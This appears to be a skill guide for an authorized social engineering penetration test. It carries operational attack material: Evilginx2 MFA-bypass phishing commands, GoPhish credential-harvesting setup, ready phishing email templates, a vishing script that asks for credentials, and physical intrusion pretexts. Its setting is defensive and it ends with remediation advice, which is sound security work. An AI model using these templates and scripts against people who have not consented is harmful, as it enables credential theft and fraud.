---
name: conducting-social-engineering-penetration-test
description: Design and execute a social engineering penetration test including phishing, vishing, smishing, and physical pretexting campaigns to measure human security resilience and identify training gaps.
domain: cybersecurity
subdomain: penetration-testing
tags: [social-engineering, phishing, vishing, pretexting, GoPhish, SET, OSINT, security-awareness, red-team]
version: "1.0"
author: mahipal
license: Apache-2.0
---

# Conducting Social Engineering Penetration Test

## Overview

Social engineering penetration testing assesses an organization's human attack surface through controlled simulation of real-world deception techniques. According to Verizon DBIR 2024, the human element is involved in approximately 68% of all breaches, with phishing remaining the dominant initial access vector. This skill covers phishing, vishing (voice phishing), smishing (SMS phishing), and physical pretexting campaigns using tools like GoPhish, the Social Engineer Toolkit (SET), and Evilginx.

## Prerequisites

- Written authorization from senior management (CISO/CTO)
- Legal review confirming compliance with local laws (CFAA, GDPR, etc.)
- Defined scope: target employee groups, attack types, exclusions
- GoPhish server, domain for phishing infrastructure, VPS
- OSINT tools: Maltego, theHarvester, LinkedIn scraping tools
- Coordination with HR and Legal for employee notification post-test

## Phase 1 — OSINT and Target Profiling

### Employee Reconnaissance

```bash
# Email harvesting
theHarvester -d targetcorp.com -b all -l 500 -f harvester_results

# LinkedIn OSINT (manual + tools)
# Gather: names, roles, departments, email format
# Identify: new hires, IT admins, finance team, executives

# Email format discovery
# Check: first.last@, flast@, firstl@
# Verify with: hunter.io, phonebook.cz, email-checker.net

# Social media OSINT
# Twitter/X: employees posting about work tools/frustrations
# Facebook: corporate event photos, office layout
# GitHub: employee repos with corporate email addresses

# Domain intelligence
dig targetcorp.com MX +short
dig targetcorp.com TXT +short
# Check for SPF, DKIM, DMARC records
# Weak DMARC = easier email spoofing

# Check breach databases (authorized)
# HaveIBeenPwned API for corporate emails
# Identify employees with compromised credentials
```

### Target Selection Matrix

| Group | Count | Pretext | Attack Vector |
|-------|-------|---------|--------------|
| Finance | 15 | Invoice approval | Phishing (credential harvest) |
| IT Help Desk | 8 | Password reset | Vishing |
| Executives | 5 | Board meeting update | Spear phishing |
| New Hires (< 90 days) | 12 | HR onboarding form | Phishing (payload) |
| All Employees | 200 | IT security update | Broad phishing |

## Phase 2 — Phishing Campaign

### Infrastructure Setup

```bash
# Register lookalike domain
# targetcorp.com -> targetc0rp.com, targetcorp-secure.com, targetcorp.net

# Set up GoPhish server
sudo apt install gophish
# Edit config.json for admin and phishing server ports
gophish

# Configure sending profile in GoPhish
# SMTP server: mail.attackdomain.com
# From: it-security@targetcorp-secure.com
# Headers: proper DKIM/SPF for attack domain

# Create landing page (credential harvesting)
# Clone legitimate login page (Office 365, Okta, etc.)
# GoPhish: Import Site -> https://login.microsoftonline.com
# Enable: Capture Credentials, Capture Passwords
# Redirect to real site after capture

# Set up Evilginx for MFA bypass (authorized testing only)
evilginx2
: config domain attackdomain.com
: config ipv4 <server_ip>
: phishlets hostname o365 login.targetcorp-secure.com
: phishlets enable o365
: lures create o365
: lures get-url 0
```

### GoPhish Campaign Configuration

```json
{
  "campaign": {
    "name": "IT Security Update - Q1 2025",
    "template": {
      "name": "Mandatory Security Training",
      "subject": "Action Required: Complete Security Awareness Training by Friday",
      "html": "<html>...[branded email with urgency]...</html>",
      "from": "IT Security Team <security@targetcorp-secure.com>"
    },
    "landing_page": "Office 365 Login Clone",
    "sending_profile": "Phishing SMTP",
    "groups": ["All Employees - Batch 1"],
    "launch_date": "2025-03-10T09:00:00Z",
    "send_by_date": "2025-03-10T12:00:00Z"
  }
}
```

### Phishing Email Templates by Pretext

**Template 1 — IT Security Update:**
```
Subject: [Action Required] Mandatory Password Reset - Security Incident
From: IT Security <security@targetcorp-secure.com>

Dear {FirstName},

Our security team has detected unauthorized access attempts on our systems.
As a precautionary measure, all employees must reset their passwords immediately.

Please click below to reset your password within the next 24 hours:

[Reset Password Now] -> {phishing_url}

Failure to comply may result in temporary account suspension.

Thank you,
IT Security Team
```

**Template 2 — Finance Invoice:**
```
Subject: Invoice #INV-2025-4821 - Approval Required
From: Accounts Payable <ap@targetcorp-secure.com>

Hi {FirstName},

Please review and approve the attached invoice from our vendor.
Amount: $47,250.00 | Due: March 15, 2025

[View Invoice] -> {phishing_url}

Best regards,
Accounts Payable
```

## Phase 3 — Vishing Campaign

### Call Script Template

```
Pretext: IT Help Desk calling about suspicious login

Caller: "Hi, this is [Name] from the IT Help Desk. Am I speaking with [Target Name]?"

[Wait for confirmation]

Caller: "We've detected some unusual login activity on your account from an
unrecognized location. For your protection, I need to verify your identity
before we can investigate further."

Caller: "Can you confirm your employee ID and the email address associated
with your account?"

[Record responses]

Caller: "Thank you. I'm going to send you a verification link to confirm
it's really you. Can you click on it and enter your credentials so we can
secure your account?"

[Send phishing link via email/SMS during call]

Caller: "Great, I can see you've been verified. Your account is now secured.
If you notice any further issues, please call the help desk at [real number]."
```

### Vishing Metrics to Track

| Metric | Description |
|--------|-------------|
| Call answered | Target picked up the phone |
| Engaged | Target continued conversation past initial question |
| Information disclosed | Target provided credentials, employee ID, or PII |
| Link clicked | Target clicked the verification link |
| Credentials entered | Target entered credentials on phishing page |
| Reported | Target reported the call to security |

## Phase 4 — Physical Social Engineering

### Physical Pretexting Scenarios

```
Scenario 1: Delivery Person
- Arrive with package labeled for executive
- Request access to deliver personally
- Attempt to tailgate through secure doors
- Drop USB drives in common areas

Scenario 2: IT Vendor
- Arrive with vendor badge (printed)
- Claim scheduled maintenance on network closet
- Attempt to access server rooms
- Install rogue wireless AP if access gained

Scenario 3: New Employee
- Arrive claiming first day orientation
- Request temporary badge
- Attempt to access restricted areas
- Photograph sensitive screens/documents

Evidence Collection:
- Body camera (if legally permitted and authorized)
- Photographs of accessed areas
- WiFi probe from rogue AP
- Notes on which doors/checkpoints bypassed
```

## Phase 5 — Metrics and Analysis

### Campaign Results Dashboard

```
Phishing Campaign Results:
├── Emails Sent: 200
├── Emails Delivered: 195 (97.5%)
├── Emails Opened: 142 (72.8%)
├── Links Clicked: 68 (34.9%)
├── Credentials Submitted: 31 (15.9%)
├── MFA Bypassed: 8 (4.1%)  [Evilginx]
├── Reported to SOC: 12 (6.2%)
└── No Action: 53 (27.2%)

Vishing Campaign Results:
├── Calls Made: 23
├── Calls Answered: 18 (78.3%)
├── Engaged in Conversation: 15 (65.2%)
├── Information Disclosed: 9 (39.1%)
├── Credentials Provided: 4 (17.4%)
└── Reported to Security: 2 (8.7%)

Physical Assessment:
├── Tailgating Successful: 3/5 attempts
├── USB Drives Plugged In: 2/10 dropped
├── Restricted Areas Accessed: 2/4 attempted
└── Challenged by Employee: 1 time
```

### Risk Scoring

| Attack Vector | Success Rate | Risk Level | Priority |
|--------------|-------------|------------|----------|
| Phishing (credential harvest) | 15.9% | High | P1 |
| Vishing (info disclosure) | 39.1% | Critical | P1 |
| Physical tailgating | 60% | High | P2 |
| USB drop | 20% | Medium | P3 |
| Spear phishing (exec) | 40% | Critical | P1 |

## Phase 6 — Reporting and Recommendations

### Remediation Priorities

| Priority | Recommendation | Timeline |
|----------|---------------|----------|
| P1 | Deploy phishing-resistant MFA (FIDO2/WebAuthn) | 30 days |
| P1 | Implement targeted security awareness training | 14 days |
| P1 | Deploy email gateway with URL rewriting | 30 days |
| P2 | Strengthen physical access controls (mantraps, visitor badges) | 60 days |
| P2 | Implement security champion program per department | 30 days |
| P3 | Deploy USB device control policy | 30 days |
| P3 | Establish phishing reporting button in email client | 14 days |

## Tools Reference

| Tool | Purpose |
|------|---------|
| GoPhish | Phishing campaign management platform |
| Evilginx2 | MFA bypass via reverse proxy phishing |
| Social Engineer Toolkit (SET) | Social engineering attack framework |
| Maltego | OSINT and relationship mapping |
| theHarvester | Email and domain OSINT |
| King Phisher | Phishing campaign tool |
| Modlishka | Reverse proxy for credential interception |

## References

- GoPhish: https://getgophish.com/
- Evilginx2: https://github.com/kgretzky/evilginx2
- Social Engineer Toolkit: https://github.com/trustedsec/social-engineer-toolkit
- Verizon DBIR: https://www.verizon.com/business/resources/reports/dbir/
- NIST SP 800-61: Computer Security Incident Handling Guide
